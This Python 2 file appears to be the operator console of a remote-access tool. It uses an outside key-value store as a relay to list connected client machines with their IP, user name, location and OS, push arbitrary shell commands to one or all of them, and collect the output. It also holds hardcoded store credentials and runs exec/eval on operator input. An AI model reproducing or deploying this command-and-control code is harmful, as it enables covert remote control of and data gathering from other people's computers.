import time
import datetime
import json
import random
import pytz
import sys

sys.path.insert(0,'..')
from my_plugins.kvdb.openkv import OpenKV
import others.arts as arts

from colorama import init, AnsiToWin32, Fore, Style
init(wrap=False)
stream = AnsiToWin32(sys.stderr).stream
win_sys = False

USER,PASS = "rock","112233"
target_client = None

if sys.platform.startswith("win"):
    win_sys = True

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def latest_val_of(kv,key,time=False):
    global USER,PASS
    if not time:
        try:
            return kv.val(kv.latest(kv.getValue(USER,PASS,str(key))[str(key)]))
        except:
            return None
    else:
        try:
            result = kv.latest(kv.getValue(USER, PASS, str(key))[str(key)])
            return result.keys()[0],result.values()[0]
        except:
            return None,None


def init_connection():
    if not win_sys:
        print bcolors.BOLD + bcolors.OKGREEN + "[+]Initiating Remote Connection" + bcolors.ENDC + bcolors.ENDC
    else:
        print >>stream, Fore.LIGHTGREEN_EX + "[+]Initiating Remote Connection" + Style.RESET_ALL
    kv = OpenKV()
    kv_id = '4K5gyNGZ'
    kv.setDB(kv_id)

    return kv

def current_time():
    tz = pytz.timezone('Asia/Shanghai')
    now = datetime.datetime.now(tz)
    now = now.replace(tzinfo=None)
    now_list = (str(now.year),str(now.month),str(now.day),str(now.hour),str(now.minute),str(now.second))
    now_str = '-'.join(now_list)
    return now_str

def server_on(kv):
    status = {}
    status['time'] = current_time()
    status['status'] = "on"
    content = json.dumps(status)
    success = kv.setValue(USER,PASS,"server_status",content)
    while not success:
        time.sleep(random.randint(1,5))
        success = kv.setValue(USER, PASS, "server_status", content)
    if not win_sys:
        print bcolors.OKGREEN + "[+]Server is now online(" + current_time() + ")" + bcolors.ENDC
    else:
        print >>stream, Fore.LIGHTGREEN_EX + "[+]Server is now online(" + current_time() + ")" + Style.RESET_ALL

def server_off(kv):
    status = {}
    status['time'] = current_time()
    status['status'] = "off"
    content = json.dumps(status)
    success = kv.setValue(USER,PASS,"server_status",content)
    while not success:
        time.sleep(random.randint(1,5))
        success = kv.setValue(USER, PASS, "server_status", content)
    if not win_sys:    
        print bcolors.WARNING + bcolors.BOLD + "[!]Server is now offline" + bcolors.ENDC + bcolors.ENDC
    else:
        print >>stream, Fore.LIGHTYELLOW_EX + "[!]Server is now offline" + Style.RESET_ALL
def get_connected_users(kv,max_check = 100):
    records = kv.getValue(USER, PASS, 'initiation')['initiation']
    key_list = records.keys()
    key_list.sort()
    key_list.reverse()
    users = []
    ips = []
    for idx,_time in enumerate(key_list):
        if idx >= max_check:
            break
        user_record = json.loads(records[_time])
        if user_record['ip'] in ips:
            continue
        ips.append(user_record['ip'])
        users.append(user_record)
    return users,ips

def str_to_time(time_str):
    main,minor = time_str.split()
    year,month,day, = main.strip().split('-')
    hour, minute, second = minor.strip().split(':')
    time_list = (int(year),int(month),int(day),int(hour),int(minute),int(second))
    return datetime.datetime(*time_list)

def serve(kv):
    global USER,PASS,target_client

    command_id = 1
    while True:
        command = ""
        target_client_name = '(' + target_client + ')' if target_client is not None else ''
        if not win_sys:
            command = raw_input(bcolors.BOLD + "Shell[" + str(command_id) + "]" + target_client_name + "> " + bcolors.ENDC)
        else:
            print >>stream, Fore.GREEN
            command = raw_input("Shell[" + str(command_id) + "]" + target_client_name + "> ")
            
        while command.strip() == "":
            if not win_sys:
                command = raw_input(bcolors.BOLD + "Shell[" + str(command_id) + "]" + target_client_name + "> " + bcolors.ENDC)
            else:
                print >>stream, Fore.GREEN
                command = raw_input("Shell[" + str(command_id) + "]" + target_client_name + "> ")
        if "=>" in command:
            command,target = command.split("=>")
            if target.strip() == "":
                target = 'all'
        elif target_client is not None:
            target = target_client
        else:
            target = 'all'
        command = command.strip()
        target = target.strip()
        dynamic_command_err = False
        #dynamic command
        if "{%" in command:
            dy_command = command
            while dy_command.find("{%") >= 0:
                head = dy_command.index("{%")+len("{%")
                tail = dy_command.index("%}")
                val_name = dy_command[head:tail].strip()
                ans = ''
                try:
                    ans = eval(val_name)
                except:
                    if not win_sys:
                        print bcolors.FAIL + "variable " + val_name + " doesn't exist"
                    else:
                        print >>stream, Fore.LIGHTRED_EX + "variable " + val_name + " doesn't exist" + Style.RESET_ALL
                    dynamic_command_err = True
                    break
                part1 = dy_command[0:dy_command.index("{%")]
                part2 = dy_command[tail+len("%}"):]
                dy_command = part1 + str(ans) + part2
            if not dynamic_command_err:
                command = dy_command
        if dynamic_command_err:
            continue
        if command == "quit" or command == "exit" or command == "terminate":
            # server shut down, update server status
            server_off(kv)
            return 0
        elif command.startswith("%exec --local ") or command.startswith("%exec -l "):
            if command.startswith("%exec --local "):
                code = command.split("%exec --local ")[1].strip()
            else:
                code = command.split("%exec -l ")[1].strip()
            try:
                exec(code)
            except Exception,e:
                if not win_sys:
                    print bcolors.FAIL + str(e) + bcolors.ENDC
                else:
                    print >>stream, Fore.LIGHTRED_EX + str(e) + Style.RESET_ALL
        elif command.startswith("%eval --local ") or command.startswith("%eval -l "):
            if command.startswith("%eval --local "):
                code = command.split("%eval --local ")[1].strip()
            else:
                code = command.split("%eval -l ")[1].strip()
            try:
                if not win_sys:
                    print bcolors.OKBLUE + str(eval(code)) + bcolors.ENDC
                else:
                    print >>stream, Fore.LIGHTBLUE_EX + str(eval(code)) + Style.RESET_ALL
            except Exception,e:
                if not win_sys:
                    print bcolors.FAIL + str(e) + bcolors.ENDC
                else:
                    print >>stream, Fore.LIGHTRED_EX + str(e) + Style.RESET_ALL
        elif command.startswith("%clients"):
            if command == "%clients":
                users,ips = get_connected_users(kv)
            else:
                try:
                    check_num = int(command.split("%clients ")[1])
                except:
                    if not win_sys:
                        print bcolors.FAIL + "arg must be integer" + bcolors.ENDC
                    else:
                        print >>stream, Fore.LIGHTRED_EX + "arg must be integer" + Style.RESET_ALL
                    break
                users,ips = get_connected_users(kv,check_num)
            if not win_sys:
                print bcolors.BOLD + 'id\tip\tuser\taddress\tos' + bcolors.ENDC
                for idx in range(len(users)):
                    print str(idx+1) + '\t' + users[idx]['ip'] + '\t' + bcolors.BOLD + users[idx]['user'] + bcolors.ENDC + '\t' + users[idx]['country']+ "(" + users[idx]['city'] +")" + '\t' + users[idx]['os']
        
            else:
                print >>stream, Fore.LIGHTBLUE_EX + 'id\tip\tuser\taddress\tos' + Style.RESET_ALL
                for idx in range(len(users)):
                    print>>stream, str(idx+1) + '\t' + users[idx]['ip'] + '\t' + Fore.LIGHTBLUE_EX + users[idx]['user'] + Style.RESET_ALL + '\t' + users[idx]['country']+ "(" + users[idx]['city'] +")" + '\t' + users[idx]['os']
        
        elif command.startswith("%target="):
            user_name = command.split("%target=")[1].strip()
            if user_name == "" or user_name.lower() == 'all':
                target_client = None
                break
            else:
                target_client = user_name
        else:
            content = {}
            content['command'] = command
            content['target'] = target
            content['id'] = str(command_id)
            content = json.dumps(content)
            if(kv.setValue(USER,PASS,'commands',content)):
                waiting_response(kv,command_id)
                command_id += 1


def waiting_response(kv,command_id):
    try:
        if not win_sys:
            print bcolors.OKGREEN + '[+]Sent and waiting...' + bcolors.ENDC
        else:
            print >>stream, Fore.LIGHTGREEN_EX + '[+]Sent and waiting...' + Style.RESET_ALL
        key = "reply_"+str(command_id)
        result = None
        while True:
            while True:
                time.sleep(1)
                arrival_time,result = latest_val_of(kv,key,time=True)
                if result is None or result == {}:
                    time.sleep(random.randint(1,4))
                    continue
                else:
                    arrival_time = str_to_time(arrival_time)
                    tz = pytz.timezone('Asia/Shanghai')
                    now = datetime.datetime.now(tz)
                    now = now.replace(tzinfo=None)
                    time_delta = now - arrival_time
                    if time_delta.seconds < 5:
                        break
                    else:
                        continue
            result_json = json.loads(result)
            if not win_sys:
                print bcolors.BOLD + bcolors.OKBLUE + "<From: "+ str(result_json['client'] + " ("+ result_json['ip'] + ")>\n") + bcolors.ENDC + bcolors.ENDC
                print bcolors.OKBLUE + result_json['result'] + bcolors.ENDC
            else:
                print >>stream, Fore.LIGHTBLUE_EX + "<From: "+ str(result_json['client'] + " ("+ result_json['ip'] + ")>\n") + Style.RESET_ALL
                print >>stream, Fore.CYAN + result_json['result'] + Style.RESET_ALL
            break
    except KeyboardInterrupt:
        if not win_sys:
            print bcolors.FAIL + '[-]Abort..' + bcolors.ENDC
        else:
            print >>stream, Fore.LIGHTRED_EX + '[-]Abort..' + Style.RESET_ALL

def show_header():
    if not win_sys:
        print bcolors.OKGREEN + arts.header() + bcolors.ENDC
    else:
        print >>stream, Fore.LIGHTGREEN_EX + arts.header() + Style.RESET_ALL

if __name__ == "__main__":
    try:
        show_header()
        db = init_connection()
        server_on(db)
        serve(db)
    except KeyboardInterrupt:
        quit()